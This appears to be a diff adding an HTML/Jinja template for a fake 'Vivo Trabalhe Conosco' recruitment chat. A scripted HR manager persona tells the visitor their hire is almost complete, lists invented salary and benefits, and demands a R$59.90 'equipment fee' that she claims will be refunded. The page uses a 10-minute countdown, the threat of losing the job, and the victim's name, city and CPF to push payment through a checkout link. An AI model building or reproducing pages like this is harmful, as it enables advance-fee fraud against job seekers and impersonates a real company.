@@ -1,0 +1,994 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+{% include 'pagamento_head.html' %}
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chat - Vivo Trabalhe Conosco</title>
+    <!-- Font Awesome CDN -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <!-- Tailwind CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Google Fonts - Sora -->
+    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Sora', 'sans-serif'],
+                    },
+                    colors: {
+                        'vivo': {
+                            'purple': '#660099',
+                            'dark': '#4d0073',
+                            'light': '#8533b3'
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+<style>
+    /* Vivo Chat Styles */
+    :root {
+        --vivo-purple: #660099;
+        --vivo-purple-dark: #4d0073;
+        --vivo-purple-light: #8533b3;
+        --vivo-gray: #666666;
+        --vivo-dark-gray: #333333;
+        --vivo-light-gray: #F2F2F2;
+        --vivo-success: #28a745;
+        --vivo-warning: #ffc107;
+        --vivo-danger: #dc3545;
+    }
+    
+    body {
+        font-family: 'Sora', sans-serif;
+        background-color: #fff;
+        color: #333;
+        line-height: 1.6;
+    }
+    
+    .vivo-container {
+        max-width: 1200px;
+        margin: 0 auto;
+        padding: 20px;
+    }
+    
+    .vivo-card {
+        background-color: #fff;
+        border-radius: 12px;
+        box-shadow: 0 8px 24px rgba(0,0,0,0.08);
+        overflow: hidden;
+    }
+    
+    .vivo-card-header {
+        background: linear-gradient(90deg, var(--vivo-purple) 0%, var(--vivo-purple-light) 100%);
+        color: white;
+        padding: 12px 20px;
+        position: relative;
+        border-radius: 12px;
+        box-shadow: 0 8px 24px rgba(0,0,0,0.08);
+    }
+    
+    .profile-header-img {
+        width: 46px;
+        height: 46px;
+        border-radius: 50%;
+        object-fit: cover;
+        border: 2px solid white;
+        box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+    }
+    
+    .chat-container {
+        overflow-y: auto;
+        padding: 10px 20px;
+        scroll-behavior: smooth;
+        display: flex;
+        flex-direction: column;
+    }
+    
+    .chat-container::-webkit-scrollbar {
+        width: 6px;
+    }
+    
+    .chat-container::-webkit-scrollbar-track {
+        background: #f1f1f1;
+    }
+    
+    .chat-container::-webkit-scrollbar-thumb {
+        background: #c9c9c9;
+        border-radius: 10px;
+    }
+    
+    .chat-container::-webkit-scrollbar-thumb:hover {
+        background: #a0a0a0;
+    }
+    
+    .message-bubble {
+        margin-bottom: 16px;
+        max-width: 75%;
+        position: relative;
+        display: flex;
+        flex-direction: column;
+    }
+    
+    .incoming-message {
+        align-self: flex-start;
+        margin-right: auto;
+        padding-left: 0px;
+        margin-left: -10px;
+    }
+    
+    .outgoing-message {
+        align-self: flex-end;
+        margin-left: auto;
+        align-items: flex-end;
+        padding-right: 0px;
+        margin-right: -10px;
+    }
+    
+    .message-content {
+        padding: 14px 18px;
+        border-radius: 18px;
+        box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+        margin-top: 4px;
+        position: relative;
+        line-height: 1.5;
+    }
+    
+    .long-message {
+        border-left: 3px solid var(--vivo-purple);
+        padding-left: 20px;
+    }
+    
+    .incoming-message .message-content {
+        background-color: var(--vivo-purple);
+        border-top-left-radius: 2px;
+        text-align: left;
+        color: white;
+        min-width: 200px;
+    }
+    
+    .outgoing-message .message-content {
+        background-color: #d4d4d4;
+        border-top-right-radius: 2px;
+        text-align: right;
+        border-right: 2px solid #999;
+    }
+    
+    .message-sender {
+        font-weight: 600;
+        font-size: 0.85rem;
+        margin-bottom: 2px;
+        color: var(--vivo-purple);
+    }
+    
+    .message-time {
+        font-size: 0.7rem;
+        color: #999;
+        margin-top: 4px;
+        display: none;
+    }
+    
+    .show-time .message-time {
+        display: block;
+    }
+    
+    .typing-indicator {
+        padding: 10px 12px;
+        background-color: #f1f1f1;
+        border-radius: 18px;
+        margin-bottom: 16px;
+        display: inline-block;
+        align-self: flex-start;
+        color: #666;
+        max-width: 75px;
+    }
+    
+    .chat-avatar {
+        width: 46px;
+        height: 46px;
+        border-radius: 50%;
+        object-fit: cover;
+        border: 2px solid white;
+        box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+    }
+    
+    .status-indicator {
+        position: absolute;
+        bottom: 0;
+        right: 0;
+        width: 14px;
+        height: 14px;
+        border-radius: 50%;
+        background-color: var(--vivo-success);
+        border: 2px solid white;
+    }
+    
+    .chat-options {
+        margin-top: 10px;
+        margin-bottom: 20px;
+        display: flex;
+        flex-direction: column;
+        gap: 12px;
+        padding-left: 0px;
+        margin-left: -10px;
+        max-width: 75%;
+    }
+    
+    .option-button {
+        background: linear-gradient(145deg, #e6e6e6, #f8f8f8);
+        border: 1px solid #d0d0d0;
+        border-radius: 12px;
+        padding: 16px 20px;
+        text-align: left;
+        transition: all 0.2s ease;
+        cursor: pointer;
+        font-weight: 500;
+        box-shadow: 
+            0 4px 8px rgba(0,0,0,0.1),
+            inset 0 1px 0 rgba(255,255,255,0.5),
+            inset 0 -1px 0 rgba(0,0,0,0.1);
+        font-size: 1.05rem;
+        margin-bottom: 12px;
+        color: #333;
+    }
+    
+    .option-button:hover {
+        background: linear-gradient(145deg, #f0f0f0, #ffffff);
+        border-color: var(--vivo-purple);
+        transform: translateY(-2px);
+        box-shadow: 
+            0 6px 16px rgba(0,0,0,0.15),
+            inset 0 1px 0 rgba(255,255,255,0.7),
+            inset 0 -1px 0 rgba(0,0,0,0.05);
+    }
+    
+    .option-button:active {
+        transform: translateY(0px);
+        box-shadow: 
+            0 2px 4px rgba(0,0,0,0.2),
+            inset 0 1px 0 rgba(0,0,0,0.1),
+            inset 0 -1px 0 rgba(255,255,255,0.3);
+    }
+    
+    .option-button.selected {
+        background: var(--vivo-purple);
+        color: white;
+        border-color: var(--vivo-purple);
+        box-shadow: 
+            0 2px 4px rgba(102, 0, 153, 0.3),
+            inset 0 1px 0 rgba(255,255,255,0.3),
+            inset 0 -1px 0 rgba(0,0,0,0.1);
+    }
+    
+    .option-button i {
+        font-size: 1.2rem;
+        margin-right: 10px;
+        vertical-align: middle;
+    }
+    
+    .timer-container {
+        background-color: #fff3e0;
+        border-radius: 12px;
+        padding: 20px;
+        margin: 20px 16px;
+        text-align: center;
+        box-shadow: 0 4px 12px rgba(255, 152, 0, 0.15);
+        position: relative;
+        border-left: 4px solid var(--vivo-warning);
+    }
+    
+    .timer-container::before {
+        content: "\f017";
+        font-family: "Font Awesome 5 Free";
+        font-weight: 900;
+        font-size: 1.2rem;
+        position: absolute;
+        top: 14px;
+        left: 14px;
+        color: var(--vivo-warning);
+    }
+    
+    .timer {
+        font-size: 2.5rem;
+        font-weight: 700;
+        color: var(--vivo-danger);
+        margin: 10px 0;
+        font-family: monospace;
+    }
+    
+    .timer-label {
+        font-size: 0.95rem;
+        color: #666;
+        margin-bottom: 15px;
+    }
+    
+    .action-button {
+        display: block;
+        background: linear-gradient(90deg, var(--vivo-purple) 0%, var(--vivo-purple-light) 100%);
+        color: white;
+        border: none;
+        border-radius: 30px;
+        padding: 14px 24px;
+        font-weight: 600;
+        letter-spacing: 0.5px;
+        transition: all 0.3s ease;
+        box-shadow: 0 4px 15px rgba(102, 0, 153, 0.3);
+        text-transform: uppercase;
+        text-decoration: none;
+        text-align: center;
+        margin-top: 10px;
+    }
+    
+    .action-button:hover {
+        transform: translateY(-3px);
+        box-shadow: 0 6px 20px rgba(102, 0, 153, 0.4);
+        color: white;
+    }
+    
+    .action-button i {
+        margin-right: 8px;
+    }
+    
+    .footer-note {
+        text-align: center;
+        font-size: 0.8rem;
+        color: #999;
+        margin-top: 20px;
+    }
+    
+    .vivo-logo {
+        height: 32px;
+    }
+    
+    .header-title {
+        margin: 0;
+        font-weight: 600;
+        font-size: 1.1rem;
+    }
+    
+    .header-subtitle {
+        margin: 0;
+        font-size: 0.85rem;
+        opacity: 0.8;
+    }
+    
+    .avatar-container {
+        position: relative;
+        margin-right: 15px;
+        flex-shrink: 0;
+    }
+    
+    .typing-animation {
+        display: flex;
+        align-items: center;
+        column-gap: 5px;
+        height: 15px;
+    }
+    
+    .typing-animation .dot {
+        display: block;
+        width: 7px;
+        height: 7px;
+        opacity: 0.8;
+        border-radius: 50%;
+        background-color: white;
+        animation: loadingFade 1s infinite;
+    }
+    
+    .typing-animation .dot:nth-child(1) {
+        animation-delay: 0s;
+    }
+    
+    .typing-animation .dot:nth-child(2) {
+        animation-delay: 0.2s;
+    }
+    
+    .typing-animation .dot:nth-child(3) {
+        animation-delay: 0.4s;
+    }
+    
+    @keyframes loadingFade {
+        0% {
+            opacity: 0.3;
+            transform: scale(0.8);
+        }
+        50% {
+            opacity: 1;
+            transform: scale(1.2);
+        }
+        100% {
+            opacity: 0.3;
+            transform: scale(0.8);
+        }
+    }
+    
+    @keyframes fadeInDown {
+        from {
+            opacity: 0;
+            transform: translateY(-30px);
+        }
+        to {
+            opacity: 1;
+            transform: translateY(0);
+        }
+    }
+    
+    @keyframes fadeOutUp {
+        from {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        to {
+            opacity: 0;
+            transform: translateY(-30px);
+        }
+    }
+    
+    @keyframes pulseLight {
+        0% {
+            box-shadow: 0 0 0 0 rgba(102, 0, 153, 0.2);
+        }
+        70% {
+            box-shadow: 0 0 0 15px rgba(102, 0, 153, 0);
+        }
+        100% {
+            box-shadow: 0 0 0 0 rgba(102, 0, 153, 0);
+        }
+    }
+    
+    .fade-out-up {
+        animation: fadeOutUp 0.5s ease-out forwards;
+    }
+    
+    .hidden {
+        display: none !important;
+    }
+    
+    .fade-in {
+        animation: fadeIn 0.5s ease forwards;
+    }
+    
+    @keyframes fadeIn {
+        from { opacity: 0; transform: translateY(10px); }
+        to { opacity: 1; transform: translateY(0); }
+    }
+    
+    .highlight-pulse {
+        animation: highlightPulse 2s infinite;
+    }
+    
+    @keyframes highlightPulse {
+        0% { box-shadow: 0 0 0 0 rgba(102, 0, 153, 0.4); }
+        70% { box-shadow: 0 0 0 10px rgba(102, 0, 153, 0); }
+        100% { box-shadow: 0 0 0 0 rgba(102, 0, 153, 0); }
+    }
+    
+    @media (max-width: 576px) {
+        .message-bubble {
+            max-width: 85%;
+        }
+        
+        .chat-container {
+            height: 55vh;
+            padding: 15px;
+        }
+        
+        .timer {
+            font-size: 2.2rem;
+        }
+    }
+</style>
+</head>
+
+<body>
+    <!-- Header with Vivo Logo and Attendant Info -->
+    <header class="bg-white shadow-sm">
+        <div class="px-4 md:px-8 py-3" style="background-color: #660099;">
+            <div class="flex justify-between items-center max-w-7xl mx-auto">
+                <div class="flex items-center">
+                    <img src="https://www.commshop.com.br/vivo-fibra/assets/apps/Vivo-roxo.png" alt="Vivo" class="h-8 md:h-10" style="filter: brightness(0) invert(1);">
+                </div>
+                <div class="flex items-center space-x-4">
+                    <a href="#" class="text-white"><i class="fas fa-search text-lg"></i></a>
+                    <a href="#" class="text-white"><i class="fas fa-user text-lg"></i></a>
+                    <a href="#" class="text-white text-sm uppercase font-medium hidden md:block">Minha Vivo</a>
+                </div>
+            </div>
+        </div>
+        <!-- Attendant Info in place of breadcrumb -->
+        <div class="bg-[#333333] text-white px-4 md:px-8 py-3">
+            <div class="max-w-7xl mx-auto">
+                <div class="flex items-center w-full">
+                    <div class="avatar-container mr-4">
+                        <img src="https://i.ibb.co/ZppGLJWj/assets-task-01jvvtc64hep781ecfs2f7gxz7-1747911650-img-0.webp" 
+                             class="chat-avatar" alt="Rafaela de Cássia">
+                        <span class="status-indicator"></span>
+                    </div>
+                    <div class="flex-1">
+                        <h2 class="header-title text-white text-lg font-semibold">Rafaela de Cássia</h2>
+                        <p class="header-subtitle text-gray-300 text-sm">Gerente de RH - Vivo</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <main class="container mx-auto px-4 py-2">
+        <div class="max-w-6xl mx-auto">
+    
+    <!-- Chat Body -->
+    <div class="overflow-hidden position-relative">
+        <div class="chat-container" id="chatContainer" style="height: calc(100vh - 200px); min-height: 400px;">
+            <!-- Messages will be inserted here by JavaScript -->
+        </div>
+        
+        <!-- Typing Indicator will be inserted dynamically -->
+    </div>
+    
+    <!-- Options will be inserted inline with messages -->
+    </main>
+
+<script>
+// Candidate data
+const candidateData = {
+    name: "{{ nome }}".trim() || "Candidato",
+    city: localStorage.getItem('userCity') || "{{ cidade }}".trim() || "São Paulo",
+    cpf: "{{ cpf }}".trim() || ""
+};
+
+// Format to show only first name
+const firstName = candidateData.name.split(' ')[0];
+
+// Chat sequence with Vivo content
+const chatSequence = [
+    {
+        message: `Olá ${firstName}, tudo bem? Aqui é a Rafaela de Cássia, Gerente de RH da Vivo.`,
+        delay: 3000
+    },
+    {
+        message: "Estou entrando em contato porque sua contratação para Atendente de Relacionamento com Cliente ainda não foi concluída. Entre os candidatos selecionados, alguns já confirmaram a matrícula no treinamento, outros já começaram o processo e só está faltando você confirmar. Para finalizar o processo, vou apenas confirmar alguns dados rapidamente com você.",
+        delay: 8000
+    },
+    {
+        message: "Todos os novos contratados vão receber o seguinte salário e benefícios:",
+        delay: 3500
+    },
+    {
+        message: `Cargo: Atendente de Relacionamento com Cliente (Home Office)\nSalário Base: R$ 1.788,60\nVale Alimentação: R$ 1.236,00 mensais\nVale Saúde Vivo: Plano de saúde completo com cobertura nacional\nBenefícios:\n• Auxílio Creche: R$ 245,00 por filho com até 6 anos de idade\n• Diária Especial: R$ 178,40 para trabalho aos fins de semana e feriados (opcional)\n• Participação nos lucros\n• Treinamentos e capacitações\n• 13º salário e férias remuneradas\n• Desconto de 50% em produtos Vivo\n\n${firstName}, você ainda tem interesse na vaga de home office em ${candidateData.city}?`,
+        delay: 4500,
+        longTypingTime: true,
+        showOptions: 'interestOptions'
+    }
+];
+
+// Conditional responses
+const interestExplanation = [
+    {
+        message: "Entendo sua decisão. Caso mude de ideia, sua vaga continuará disponível por mais 24 horas em nosso sistema.",
+        delay: 2000
+    },
+    {
+        message: "Se decidir prosseguir com a candidatura, basta acessar novamente o link que enviamos. Obrigada pelo seu tempo e atenção!",
+        delay: 2500
+    }
+];
+
+const startWorkResponses = {
+    showBenefits: [
+        {
+            message: "Perfeito! Obrigada por confirmar seu interesse. Agora vou fazer só mais algumas perguntas para finalizar o processo.",
+            delay: 3500
+        },
+        {
+            message: "Como Atendente de Relacionamento com Cliente, você trabalhará de segunda a sexta, com jornada de 8 horas diárias, totalmente home office.",
+            delay: 4000
+        },
+        {
+            message: "A Vivo fornecerá gratuitamente todo o treinamento inicial, que será realizado online.",
+            delay: 4500
+        },
+        {
+            message: "Durante o treinamento, você aprenderá sobre nossos produtos, sistemas internos e técnicas de atendimento ao cliente.",
+            delay: 4500
+        },
+        {
+            message: "Após a aprovação no treinamento, você receberá todos os equipamentos necessários para trabalhar: notebook, headset profissional e uniforme.",
+            delay: 4000
+        },
+        {
+            message: "Para garantir a segurança dos equipamentos que serão enviados para sua casa (notebook, headset e materiais), a empresa solicita o pagamento de uma Taxa de Uso dos Equipamentos no valor de R$ 59,90.",
+            delay: 5500,
+            showImage: 'https://i.ibb.co/s9TNbjWP/assets-task-01jvmjhjnefe58ezr0bj1a70h5-1747668560-img-1-1.webp'
+        },
+        {
+            message: "Esta taxa é uma garantia para os equipamentos, que têm valor superior a R$ 3.500,00. Infelizmente, já tivemos casos em que candidatos receberam os equipamentos e desistiram da vaga sem devolvê-los.",
+            delay: 5500
+        },
+        {
+            message: "É importante esclarecer que esta taxa será integralmente reembolsada junto com seu primeiro salário, que será pago no dia 05/07/2025.",
+            delay: 4500
+        },
+        {
+            message: "Sem o pagamento, infelizmente não conseguirei enviar os equipamentos e você pode perder a vaga a qualquer momento.",
+            delay: 4000
+        },
+        {
+            message: `${firstName}, você vai realizar o pagamento da taxa ou deseja desistir da vaga?`,
+            delay: 3500,
+            showOptions: 'paymentOptions'
+        }
+    ]
+};
+
+const paymentConfirmation = [
+    {
+        message: "Perfeito! Vou segurar sua vaga, mas você precisa realizar o pagamento e confirmar para mim o quanto antes.",
+        delay: 4000
+    },
+    {
+        message: "Para realizar o pagamento é só clicar no botão abaixo para acessar a guia de pagamento.",
+        delay: 4500,
+        showPaymentButton: true
+    }
+];
+
+const desistirExplanation = [
+    {
+        message: "Entendo sua decisão. Infelizmente sua vaga será liberada para outros candidatos. Caso mude de ideia, pode entrar em contato conosco novamente.",
+        delay: 4000
+    }
+];
+
+const paymentExplanation = [
+    {
+        message: "Excelente escolha! Vou reservar a vaga exclusivamente para você e iniciar o processo de envio dos equipamentos.",
+        delay: 2500
+    },
+    {
+        message: "Para finalizar seu processo de contratação e confirmar o envio dos equipamentos necessários (notebook, headset e uniforme), precisamos que você efetue o pagamento da Taxa de Uso dos Equipamentos.",
+        delay: 3800
+    },
+    {
+        message: "Esta taxa de R$ 59,90 serve como uma garantia para o envio dos equipamentos, que têm valor superior a R$ 3.500,00. É uma medida de segurança exigida pelo nosso departamento financeiro.",
+        delay: 4200
+    },
+    {
+        message: "O valor será integralmente reembolsado no seu primeiro pagamento, que acontece sempre no dia 05 de cada mês.",
+        delay: 3500
+    },
+    {
+        message: "Após a confirmação do pagamento, os equipamentos serão enviados em até 3 dias úteis para o endereço que você cadastrou em nosso sistema.",
+        delay: 3000
+    },
+    {
+        message: `${firstName}, posso definir um prazo de 10 minutos para você efetuar esse pagamento? Assim garantimos sua vaga e iniciamos imediatamente os procedimentos para o envio dos equipamentos.`,
+        delay: 3200,
+        showTimer: true
+    }
+];
+
+// DOM elements
+const chatContainer = document.getElementById('chatContainer');
+
+// Time formatting
+function getFormattedTime() {
+    const now = new Date();
+    return now.getHours().toString().padStart(2, '0') + ':' + 
+           now.getMinutes().toString().padStart(2, '0');
+}
+
+// Add message to chat
+function addMessage(message, isIncoming = true, showTime = false) {
+    // Remove show-time class from all previous messages
+    document.querySelectorAll('.message-bubble').forEach(bubble => {
+        bubble.classList.remove('show-time');
+    });
+    
+    const messageDiv = document.createElement('div');
+    messageDiv.className = `message-bubble ${isIncoming ? 'incoming-message' : 'outgoing-message'} fade-in`;
+    
+    // Add show-time class if this should show time
+    if (showTime) {
+        messageDiv.classList.add('show-time');
+    }
+    
+    const messageContent = document.createElement('div');
+    messageContent.className = 'message-content';
+    messageContent.innerHTML = message.replace(/\n/g, '<br>');
+    
+    const timeDiv = document.createElement('div');
+    timeDiv.className = 'message-time';
+    timeDiv.textContent = getFormattedTime();
+    
+    messageDiv.appendChild(messageContent);
+    messageDiv.appendChild(timeDiv);
+    chatContainer.appendChild(messageDiv);
+    
+    // Auto scroll to bottom smoothly
+    setTimeout(() => {
+        chatContainer.scrollTop = chatContainer.scrollHeight;
+    }, 100);
+}
+
+// Show typing indicator
+function showTyping(duration = 3000) {
+    return new Promise(resolve => {
+        // Create typing indicator
+        const typingDiv = document.createElement('div');
+        typingDiv.className = 'message-bubble incoming-message typing-indicator-bubble';
+        typingDiv.style.paddingLeft = '0px';
+        typingDiv.style.marginLeft = '-10px';
+        typingDiv.innerHTML = `
+            <div class="message-content d-flex align-items-center" style="background-color: var(--vivo-purple); color: white; min-width: 70px; max-width: 70px; border-radius: 18px; padding: 10px 15px;">
+                <div class="typing-animation">
+                    <span class="dot"></span>
+                    <span class="dot"></span>
+                    <span class="dot"></span>
+                </div>
+            </div>
+        `;
+        
+        // Add to chat container
+        chatContainer.appendChild(typingDiv);
+        chatContainer.scrollTop = chatContainer.scrollHeight;
+        
+        setTimeout(() => {
+            // Remove typing indicator
+            if (typingDiv.parentNode) {
+                typingDiv.parentNode.removeChild(typingDiv);
+            }
+            resolve();
+        }, duration);
+    });
+}
+
+// Hide all option groups
+function hideAllOptions() {
+    document.querySelectorAll('.chat-options').forEach(el => {
+        el.style.display = 'none';
+    });
+}
+
+// Show specific option group inline
+function showOptions(optionsId) {
+    let optionsHtml = '';
+    
+    if (optionsId === 'interestOptions') {
+        optionsHtml = `
+            <div class="chat-options">
+                <button class="option-button mb-2 d-block w-100 text-start" onclick="handleOptionClick(this, 'Sim, tenho interesse', 'showBenefits')">
+                    <i class="fas fa-check-circle" style="color: var(--vivo-success);"></i> 
+                    Sim, tenho interesse
+                </button>
+                <button class="option-button d-block w-100 text-start" onclick="handleOptionClick(this, 'Não tenho interesse', 'showInterestExplanation')">
+                    <i class="fas fa-times-circle" style="color: var(--vivo-danger);"></i> 
+                    Não tenho interesse
+                </button>
+            </div>
+        `;
+    } else if (optionsId === 'paymentOptions') {
+        optionsHtml = `
+            <div class="chat-options">
+                <button class="option-button mb-2 d-block w-100 text-start" onclick="handleOptionClick(this, 'Vou realizar o pagamento', 'showPaymentConfirmation')">
+                    Vou realizar o pagamento
+                </button>
+                <button class="option-button d-block w-100 text-start" onclick="handleOptionClick(this, 'Quero desistir da vaga', 'showDesistirExplanation')">
+                    <i class="fas fa-times-circle" style="color: var(--vivo-danger);"></i>
+                    Quero desistir da vaga
+                </button>
+            </div>
+        `;
+    }
+    
+    if (optionsHtml) {
+        chatContainer.insertAdjacentHTML('beforeend', optionsHtml);
+        chatContainer.scrollTop = chatContainer.scrollHeight;
+    }
+}
+
+// Handle option click
+function handleOptionClick(button, responseText, nextAction) {
+    // Add user response to chat
+    addMessage(responseText, false, true);
+    
+    // Remove the options container
+    const optionsContainer = button.closest('.chat-options');
+    if (optionsContainer) {
+        optionsContainer.remove();
+    }
+    
+    // Show typing and continue conversation
+    setTimeout(async () => {
+        if (nextAction === 'showInterestExplanation') {
+            await processMessageSequence(interestExplanation);
+        } else if (nextAction === 'showBenefits') {
+            await sendSequence(startWorkResponses.showBenefits);
+        } else if (nextAction === 'showPaymentExplanation') {
+            await processMessageSequence(paymentExplanation);
+        } else if (nextAction === 'showPaymentConfirmation') {
+            await sendSequence(paymentConfirmation);
+        } else if (nextAction === 'showDesistirExplanation') {
+            await processMessageSequence(desistirExplanation);
+        }
+    }, 1000);
+}
+
+// Send message sequence for specific response
+async function sendSequence(responses) {
+    for (let i = 0; i < responses.length; i++) {
+        const response = responses[i];
+        
+        // Get message text (handle functions)
+        const messageText = typeof response.message === 'function' ? response.message() : response.message;
+        
+        // Show typing indicator with increased duration based on message length
+        const typingDuration = response.longTypingTime ? 
+            Math.min(messageText.length * 150, 12000) : 
+            Math.min(messageText.length * 120, 8000);
+        
+        await showTyping(typingDuration);
+        
+        // Add message
+        addMessage(messageText, true, i === responses.length - 1);
+        
+        // Show image if specified (without chat bubble background)
+        if (response.showImage) {
+            setTimeout(() => {
+                const imageDiv = document.createElement('div');
+                imageDiv.className = 'fade-in';
+                imageDiv.style.paddingLeft = '0px';
+                imageDiv.style.marginLeft = '-10px';
+                imageDiv.style.marginBottom = '15px';
+                imageDiv.innerHTML = `
+                    <img src="${response.showImage}" alt="Kit de equipamentos" style="max-width: 300px; width: 100%; height: auto; border-radius: 8px; margin: 10px 0;">
+                `;
+                chatContainer.appendChild(imageDiv);
+                chatContainer.scrollTop = chatContainer.scrollHeight;
+            }, 500);
+        }
+        
+        // Show timer if specified
+        if (response.showTimer) {
+            setTimeout(() => {
+                const currentParams = new URLSearchParams(window.location.search);
+                const paymentUrl = `/carregando_transacao${currentParams.toString() ? '?' + currentParams.toString() : ''}`;
+                const timerHtml = `
+                    <div class="timer-container mx-auto highlight-pulse" style="max-width: 600px; margin: 20px 0;">
+                        <div class="timer" id="timer">10:00</div>
+                        <div class="timer-label">Tempo restante para garantir sua vaga</div>
+                        <a href="${paymentUrl}" class="action-button">
+                            <i class="fas fa-lock"></i> Efetuar Pagamento da Taxa de Equipamentos
+                        </a>
+                        <p class="mt-2 small text-muted">
+                            O valor de R$ 59,90 será totalmente reembolsado no seu primeiro salário.
+                        </p>
+                    </div>
+                `;
+                chatContainer.insertAdjacentHTML('beforeend', timerHtml);
+                chatContainer.scrollTop = chatContainer.scrollHeight;
+                
+                // Start timer
+                let timeLeft = 600; // 10 minutes
+                const timerElement = document.getElementById('timer');
+                const countdown = setInterval(() => {
+                    const minutes = Math.floor(timeLeft / 60);
+                    const seconds = timeLeft % 60;
+                    timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                    
+                    if (timeLeft <= 0) {
+                        clearInterval(countdown);
+                        timerElement.textContent = "00:00";
+                    }
+                    
+                    timeLeft--;
+                }, 1000);
+            }, 1000);
+        }
+        
+        // Show payment button if specified
+        if (response.showPaymentButton) {
+            setTimeout(() => {
+                const currentParams = new URLSearchParams(window.location.search);
+                const paymentUrl = `/carregando_transacao${currentParams.toString() ? '?' + currentParams.toString() : ''}`;
+                const buttonHtml = `
+                    <div class="text-center" style="margin: 20px 0;">
+                        <a href="${paymentUrl}" class="inline-block px-6 py-3 bg-green-600 text-white font-semibold rounded-lg hover:bg-green-700 transition-colors duration-200" style="text-decoration: none; background-color: #16a34a;">
+                            <i class="fas fa-credit-card mr-2"></i>
+                            Realizar Pagamento Agora
+                        </a>
+                    </div>
+                `;
+                chatContainer.insertAdjacentHTML('beforeend', buttonHtml);
+                chatContainer.scrollTop = chatContainer.scrollHeight;
+            }, 1000);
+        }
+        
+        // Show options if specified
+        if (response.showOptions) {
+            setTimeout(() => {
+                showOptions(response.showOptions);
+            }, 1000);
+        }
+        
+        // Wait before next message - increased delay for better reading experience
+        if (i < responses.length - 1) {
+            const readingDelay = Math.max(response.delay * 1.5, 4000); // Minimum 4 seconds between messages
+            await new Promise(resolve => setTimeout(resolve, readingDelay));
+        }
+    }
+}
+
+// Process message sequence
+async function processMessageSequence(sequence) {
+    for (let i = 0; i < sequence.length; i++) {
+        const msg = sequence[i];
+        const isLastMessage = i === sequence.length - 1;
+        const typingTime = msg.longTypingTime ? 8000 : 5000;
+        
+        await showTyping(typingTime);
+        addMessage(msg.message, true, isLastMessage);
+        
+        if (msg.showOptions) {
+            setTimeout(() => showOptions(msg.showOptions), 1000);
+        }
+        
+        if (msg.showTimer) {
+            setTimeout(() => {
+                const currentParams = new URLSearchParams(window.location.search);
+                const paymentUrl = `/carregando_transacao${currentParams.toString() ? '?' + currentParams.toString() : ''}`;
+                const timerHtml = `
+                    <div class="timer-container mx-auto highlight-pulse" style="max-width: 600px; margin: 20px 0;">
+                        <div class="timer" id="timer">10:00</div>
+                        <div class="timer-label">Tempo restante para garantir sua vaga</div>
+                        <a href="${paymentUrl}" class="action-button">
+                            <i class="fas fa-lock"></i> Efetuar Pagamento da Taxa de Equipamentos
+                        </a>
+                        <p class="mt-2 small text-muted">
+                            O valor de R$ 59,90 será totalmente reembolsado no seu primeiro salário.
+                        </p>
+                    </div>
+                `;
+                chatContainer.insertAdjacentHTML('beforeend', timerHtml);
+                chatContainer.scrollTop = chatContainer.scrollHeight;
+                
+                // Start timer
+                let timeLeft = 600;
+                const timerElement = document.getElementById('timer');
+                const countdown = setInterval(() => {
+                    const minutes = Math.floor(timeLeft / 60);
+                    const seconds = timeLeft % 60;
+                    timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                    
+                    if (timeLeft <= 0) {
+                        clearInterval(countdown);
+                        timerElement.textContent = "00:00";
+                    }
+                    
+                    timeLeft--;
+                }, 1000);
+            }, 1000);
+        }
+        
+        await new Promise(resolve => setTimeout(resolve, msg.delay));
+    }
+}
+
+// Initialize chat
+async function initializeChat() {
+    // Hide all options initially
+    hideAllOptions();
+    
+    // Start chat sequence immediately
+    await processMessageSequence(chatSequence);
+}
+
+// Start chat when page loads
+document.addEventListener('DOMContentLoaded', initializeChat);
+</script>
+
+</body>
+</html>
